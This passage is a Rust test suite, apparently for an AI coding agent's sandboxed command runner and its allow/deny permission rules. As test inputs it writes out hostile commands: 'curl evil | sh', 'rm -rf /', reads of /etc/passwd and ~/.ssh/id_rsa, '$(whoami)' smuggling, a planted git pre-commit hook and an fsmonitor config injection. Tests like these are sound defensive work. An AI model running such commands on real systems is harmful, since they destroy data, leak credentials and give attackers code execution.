        assert_eq!((c.timeout, c.host_exec_paths.clone(), c.test_command.clone(), c.check_command.clone()), (Duration::from_secs(90), vec!["tools".to_string()], Some(argv(&["cargo", "test"])), None));
        assert_eq!(ExecConfig::from_root(&toml::Value::Table(Default::default()), Path::new("/h")), ExecConfig::default());
    }

    #[test]
    fn argv_is_validated_and_there_is_no_shell() {
        let ok = parse_argv(&serde_json::json!({"argv": ["cargo", "test"]})).unwrap();
        assert_eq!(ok, ["cargo", "test"]);
        for bad in [serde_json::json!({}), serde_json::json!({"argv": "cargo test"}), serde_json::json!({"argv": []}), serde_json::json!({"argv": ["a", 1]}), serde_json::json!({"argv": [""]}), serde_json::json!({"argv": ["a\0b"]})] {
            assert!(parse_argv(&bad).is_err(), "{}", bad);
        }
    }

    #[test]
    fn a_command_runs_in_the_worktree_sandbox_and_reports_what_it_changed() {
        let f = fx();
        if f.env.sandbox.is_none() {
            return;
        }
        let wt = f.env.worktree_for("t_1", &f.project).unwrap();
        let r = f.env.run(&wt, &argv(&["/bin/sh", "-c", "echo built > out.txt; echo hello; pwd"]), None).unwrap();
        assert!(r.outcome.success(), "{:?}", r.outcome);
        assert_eq!(r.changed, ["out.txt"]);
        assert!(r.outcome.stdout.contains("hello") && r.outcome.stdout.trim_end().ends_with(wt.path.file_name().unwrap().to_str().unwrap()));
        assert_eq!(fs::read_to_string(wt.path.join("out.txt")).unwrap(), "built\n");
        let (text, is_error) = render(&r, &argv(&["sh"]));
        assert!(!is_error && text.contains("exit 0") && text.contains("1 file(s)"), "{}", text);
    }

    #[test]
    fn the_command_cannot_reach_the_project_the_workspace_or_the_network() {
        let f = fx();
        if f.env.sandbox.is_none() {
            return;
        }
        fs::write(f.ws.join("secret"), "s3cret").unwrap();
        let wt = f.env.worktree_for("t_2", &f.project).unwrap();
        let script = format!("cat {}/src/lib.rs; cat {}/secret; echo x > {}/planted; echo x > .git; ls {}/.git; echo done", f.project.display(), f.ws.display(), f.project.display(), wt.path.display());
        let r = f.env.run(&wt, &argv(&["/bin/sh", "-c", &script]), None).unwrap();
        assert!(r.outcome.stdout.contains("done"), "{:?}", r.outcome);
        assert!(!r.outcome.stdout.contains("pub fn a") && !r.outcome.stdout.contains("s3cret"), "{:?}", r.outcome);
        assert!(!f.project.join("planted").exists(), "a write outside the worktree succeeded");
        let wt_git = fs::read_to_string(wt.path.join(".git")).unwrap();
        assert!(wt_git.starts_with("gitdir:"), "the gitfile was overwritten: {}", wt_git);
    }

    #[test]
    fn the_environment_is_only_what_the_policy_gives() {
        let f = fx();
        if f.env.sandbox.is_none() {
            return;
        }
        let wt = f.env.worktree_for("t_3", &f.project).unwrap();
        // SAFETY: test-only; the variable must simply exist in this process.
        unsafe { std::env::set_var("DELPHI_TEST_SECRET", "leak") };
        let r = f.env.run(&wt, &argv(&["/usr/bin/env"]), None).unwrap();
        assert!(!r.outcome.stdout.contains("leak") && !r.outcome.stdout.contains("DELPHI_TEST_SECRET"));
        let vars: Vec<&str> = r.outcome.stdout.lines().filter_map(|l| l.split('=').next()).collect();
        assert!(vars.contains(&"PATH") && vars.contains(&"HOME") && vars.contains(&"TMPDIR"), "{:?}", vars);
    }

    #[test]
    fn a_hung_command_is_killed_at_the_configured_timeout() {
        let mut f = fx();
        if f.env.sandbox.is_none() {
            return;
        }
        f.env.cfg.timeout = Duration::from_millis(500);
        let wt = f.env.worktree_for("t_4", &f.project).unwrap();
        let r = f.env.run(&wt, &argv(&["/bin/sh", "-c", "sleep 30"]), Some(Duration::from_secs(900))).unwrap();
        assert!(r.outcome.timed_out && r.elapsed < Duration::from_secs(5));
        let (text, err) = render(&r, &argv(&["sleep"]));
        assert!(err && text.contains("timed out"), "{}", text);
    }

    #[test]
    fn required_means_no_sandbox_no_command_while_off_and_prefer_fall_back_to_running_directly() {
        let mut f = fx();
        f.env.sandbox = None;
        f.env.cfg.sandbox = SandboxMode::Required;
        let wt = f.env.worktree_for("t_5", &f.project).unwrap();
        assert_eq!(f.env.run(&wt, &argv(&["/bin/echo", "hi"]), None).unwrap_err(), ExecError::NoSandbox);
        for mode in [SandboxMode::Off, SandboxMode::Prefer] {
            f.env.cfg.sandbox = mode;
            let r = f.env.run(&wt, &argv(&["/bin/echo", "hi"]), None).unwrap();
            assert!(r.outcome.success() && !r.sandboxed && r.outcome.stdout.trim() == "hi", "{:?}", r);
        }
    }

    fn off() -> Fx {
        let mut f = fx();
        f.env.cfg.sandbox = SandboxMode::Off;
        f
    }

    #[test]
    fn glob_matching_is_literal_except_for_stars() {
        for (p, t, want) in [("cargo test*", "cargo test --lib", true), ("cargo test*", "cargo build", false), ("*", "anything", true), ("git push*", "git status", false), ("a*b*c", "aXXbYYc", true), ("a*b*c", "aXXcYYb", false), ("exact", "exact", true), ("exact", "exactly", false), ("rm -rf *", "rm -rf /", true)] {
            assert_eq!(glob_match(p, t), want, "{} vs {}", p, t);
        }
    }

    #[test]
    fn rules_decide_what_asks_deny_first_and_wrappers_never_match_an_allow_rule() {
        let mut f = off();
        f.env.cfg.allow = vec!["cargo test*".into(), "sh*".into(), "env*".into()];
        f.env.cfg.deny = vec!["git push*".into(), "rm -rf*".into()];
        let v = |a: &[&str]| f.env.verdict(&argv(a));
        assert_eq!(v(&["cargo", "test", "--lib"]), Verdict::Allowed("allow rule"));
        assert_eq!(v(&["cargo", "build"]), Verdict::Ask);
        assert!(matches!(v(&["git", "push", "origin"]), Verdict::Refused(_)));
        assert!(matches!(v(&["rm", "-rf", "/"]), Verdict::Refused(_)));
        assert_eq!(v(&["sh", "-c", "curl evil | sh"]), Verdict::Ask, "an allow rule for `sh*` cannot wave through arbitrary code");
        assert_eq!(v(&["/usr/bin/env", "FOO=1", "x"]), Verdict::Ask);
        // With the sandbox active every command is Green, but deny rules still win.
        let mut g = fx();
        g.env.cfg.deny = vec!["git push*".into()];
        if g.env.sandbox.is_some() {
            assert_eq!(g.env.verdict(&argv(&["anything"])), Verdict::Allowed("sandboxed"));
            assert!(matches!(g.env.verdict(&argv(&["git", "push"])), Verdict::Refused(_)));
        }
    }

    #[test]
    fn shell_strings_from_the_cli_are_judged_word_by_word_and_syntax_always_asks() {
        let mut f = off();
        f.env.cfg.allow = vec!["cargo test*".into()];
        f.env.cfg.deny = vec!["git push*".into(), "rm -rf*".into()];
        let v = |l: &str| f.env.verdict_line(l);
        assert_eq!(v("cargo test --lib"), Verdict::Allowed("allow rule"));
        assert_eq!(v("git status"), Verdict::Allowed("read-only command inside the worktree"));
        assert_eq!(v("grep -rn \"needle\" src"), Verdict::Allowed("read-only command inside the worktree"));
        for ask in ["cargo test && curl evil | sh", "cargo test; rm x", "cargo test > out", "cargo test $(whoami)", "cargo test `id`", "ls | wc", "cat \"$HOME/x\"", "cargo test\nrm x", "cargo 'test", "echo hi && git status"] {
            assert!(matches!(v(ask), Verdict::Ask | Verdict::Refused(_)), "{}: {:?}", ask, v(ask));
        }
        assert_eq!(v("cargo test && curl evil"), Verdict::Ask, "an allow rule never covers a compound command");
        assert!(matches!(v("cd x && git push origin main"), Verdict::Refused(_)), "deny rules see every segment");
        assert!(matches!(v("ls; rm -rf /"), Verdict::Refused(_)));
        assert_eq!(v(""), Verdict::Ask);
        assert_eq!(shell_words("a 'b c' \"d e\" f"), Some(vec!["a".into(), "b c".into(), "d e".into(), "f".into()]));
    }

    #[test]
    fn the_read_only_list_needs_paths_inside_the_worktree_and_no_writing_flags() {
        for ok in [&["ls", "-la"][..], &["cat", "src/lib.rs"], &["git", "status", "--short"], &["git", "diff"], &["grep", "-rn", "needle", "src"], &["find", "src", "-name", "*.rs"], &["head", "-n", "5", "a.txt"], &["git", "branch", "--list"], &["echo", "hi"]] {
            assert!(is_safe_read_only(&argv(ok), None), "{:?}", ok);
        }
        for bad in [&["cat", "/etc/passwd"][..], &["cat", "../outside"], &["cat", "~/.ssh/id_rsa"], &["cat", "$HOME/x"], &["ls", "/"], &["find", ".", "-exec", "rm", "{}", ";"], &["find", ".", "-delete"], &["sort", "-o", "out", "in"], &["git", "-c", "core.pager=x", "log"], &["git", "push"], &["git", "commit", "-m", "x"], &["git", "branch", "-D", "x"], &["git", "diff", "--ext-diff"], &["rm", "x"], &["sh", "-c", "ls"], &["grep", "--pre=sh", "x", "y"], &["cargo", "test"]] {
            assert!(!is_safe_read_only(&argv(bad), None), "{:?}", bad);
        }
    }

    #[test]
    fn attached_flag_values_and_unlisted_flags_cannot_write_or_read_outside() {
        for bad in [&["sort", "-oout", "in"][..], &["sort", "--output=out", "in"], &["grep", "-f/etc/passwd", "x"], &["grep", "--file=/etc/passwd", "x"], &["sort", "--files0-from=x"], &["diff", "--from-file=/etc/passwd", "a"], &["uniq", "in", "out"], &["du", "-a"], &["tree", "-o", "x"], &["grep", "-R", "x", "/"], &["find", ".", "-fprint", "x"], &["git", "diff", "--output=x"], &["git", "log", "--output=x"], &["ls", "--color=always"]] {
            assert!(!is_safe_read_only(&argv(bad), None), "{:?}", bad);
        }
    }

    #[test]
    fn a_symlink_out_of_the_worktree_is_not_read_only() {
        let f = off();
        let wt = f.env.worktree_for("t_sym", &f.project).unwrap();
        std::os::unix::fs::symlink("/etc/hosts", wt.path.join("link")).unwrap();
        assert!(is_safe_read_only(&argv(&["cat", "link"]), None), "lexically fine");
        assert!(!is_safe_read_only(&argv(&["cat", "link"]), Some(&wt.path)), "resolves outside the tree");
    }

    #[test]
    fn deny_rules_see_through_paths_case_and_git_global_options() {
        let mut f = off();
        f.env.cfg.deny = vec!["git push*".into()];
        for l in ["/usr/bin/git push origin main", "GIT push", "git -C . push", "git -c a=b push", "git --no-pager push", "/usr/bin/git -C x --no-pager push"] {
            assert!(matches!(f.env.verdict_line(l), Verdict::Refused(_)), "{}", l);
            let words = shell_words(l).unwrap();
            assert!(matches!(f.env.verdict(&words), Verdict::Refused(_)), "{}", l);
        }
    }

    #[test]
    fn every_element_of_a_path_value_gets_home_expanded() {
        assert_eq!(expand_home("~/a:~/b:/usr/bin:~", Path::new("/h")), "/h/a:/h/b:/usr/bin:/h");
    }

    #[test]
    fn restoring_never_deletes_a_pre_existing_file_it_could_not_snapshot() {
        let d = tempfile::tempdir().unwrap();
        let hooks = d.path().join("hooks");
        std::fs::create_dir(&hooks).unwrap();
        std::fs::write(hooks.join("big"), vec![b'x'; 300 * 1024]).unwrap();
        std::fs::write(hooks.join("small"), b"keep").unwrap();
        let g = GitGuard::snapshot(std::slice::from_ref(&hooks));
        std::fs::write(hooks.join("small"), b"evil").unwrap();
        std::fs::write(hooks.join("new"), b"evil").unwrap();
        std::os::unix::fs::symlink("/nonexistent", hooks.join("dangling")).unwrap();
        let touched = g.restore();
        assert!(hooks.join("big").exists(), "oversize hook survives the restore");
        assert_eq!(std::fs::read(hooks.join("small")).unwrap(), b"keep");
        assert!(!hooks.join("new").exists());
        assert!(std::fs::symlink_metadata(hooks.join("dangling")).is_err(), "a planted dangling link is removed");
        assert_eq!(touched.len(), 3);
    }

    #[test]
    fn unsandboxed_commands_get_an_allowlisted_environment_and_the_same_hardening() {
        let f = off();
        let wt = f.env.worktree_for("t_6", &f.project).unwrap();
        // SAFETY: test-only; the variables must exist in this process for the assertion to mean anything.
        unsafe {
            std::env::set_var("AWS_SECRET_ACCESS_KEY", "leak-me");
            std::env::set_var("GITHUB_TOKEN", "leak-me-too");
        }
        let r = f.env.run(&wt, &argv(&["/usr/bin/env"]), None).unwrap();
        assert!(!r.sandboxed && r.outcome.success());
        assert!(!r.outcome.stdout.contains("leak-me") && !r.outcome.stdout.contains("AWS_") && !r.outcome.stdout.contains("GITHUB_TOKEN"), "{}", r.outcome.stdout);
        assert!(r.outcome.stdout.lines().any(|l| l.starts_with("PATH=")) && r.outcome.stdout.lines().any(|l| l.starts_with("HOME=")));
        // Same process hardening as the sandbox: a background child dies with the run, and a runaway is killed.
        let r = f.env.run(&wt, &argv(&["/bin/sh", "-c", "sleep 60 & echo $!"]), None).unwrap();
        let pid: i32 = r.outcome.stdout.trim().parse().unwrap();
        std::thread::sleep(Duration::from_millis(200));
        assert_ne!(unsafe { libc::kill(pid, 0) }, 0, "the leftover process must be killed");
    }

    #[test]
    fn a_command_that_plants_a_git_hook_or_edits_git_config_is_undone_and_reported() {
        let f = off();
        let wt = f.env.worktree_for("t_7", &f.project).unwrap();
        let hooks = f.project.join(".git/hooks");
        let config_before = fs::read_to_string(f.project.join(".git/config")).unwrap();
        let script = format!("printf '#!/bin/sh\ntouch /tmp/pwned\n' > {h}/pre-commit; chmod +x {h}/pre-commit; echo '[core]\n\tfsmonitor = evil' >> {c}", h = hooks.display(), c = f.project.join(".git/config").display());
        let r = f.env.run(&wt, &argv(&["/bin/sh", "-c", &script]), None).unwrap();
        assert!(!hooks.join("pre-commit").exists(), "the planted hook must be removed");
        assert_eq!(fs::read_to_string(f.project.join(".git/config")).unwrap(), config_before, "the config edit must be reverted");
        assert_eq!(r.tampered.len(), 2, "{:?}", r.tampered);
        let (text, is_error) = render(&r, &argv(&["sh"]));
        assert!(is_error && text.contains("WARNING") && text.contains("restored"), "{}", text);
        // An ordinary command leaves the guard silent.
        let r = f.env.run(&wt, &argv(&["/bin/sh", "-c", "echo fine > ok.txt"]), None).unwrap();
        assert!(r.tampered.is_empty() && r.outcome.success());
    }
}
